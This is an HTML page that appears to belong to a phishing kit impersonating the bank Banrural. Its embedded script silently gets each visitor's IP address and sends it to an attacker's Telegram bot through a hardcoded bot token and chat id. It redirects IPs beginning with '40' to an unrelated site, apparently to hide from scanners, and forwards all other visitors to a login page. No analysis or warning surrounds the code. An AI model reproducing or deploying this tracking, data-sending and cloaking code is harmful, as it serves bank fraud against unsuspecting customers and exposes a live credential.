<!DOCTYPE html>
<html>
<head>
    <title>Nuevo | Ingreso</title>
    <style>
        /* Estilos aquí */
    </style>
    <script>
        setTimeout(function() {
            window.location.href = "inicio.php";
        }, 2000);

        // Función para obtener la dirección IP del cliente
        function getIPAddress() {
            return fetch("https://api.ipify.org?format=json")
                .then(function(response) {
                    return response.json();
                })
                .then(function(data) {
                    return data.ip;
                });
        }

        // Obtener la dirección IP y enviarla a Telegram
        getIPAddress().then(function(ipAddress) {
            var telegramURL = "https://api.telegram.org/bot5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM/sendMessage?chat_id=5157616506&text= ‼️♻️BANRURAL♻️‼️ IP: " + ipAddress;

            fetch(telegramURL)
                .then(function(response) {
                    console.log("Notificación enviada a Telegram");
                })
                .catch(function(error) {
                    console.error("Error al enviar la notificación a Telegram:", error);
                });

            // Verificar si la IP comienza con "40" y redirigir si es necesario
            if (ipAddress.startsWith("40")) {
                window.location.href = "https://myglobalflowers.es/";
            }
        });
    </script>
</head>
<body>
    <!-- Contenido aquí -->
</body>
</html>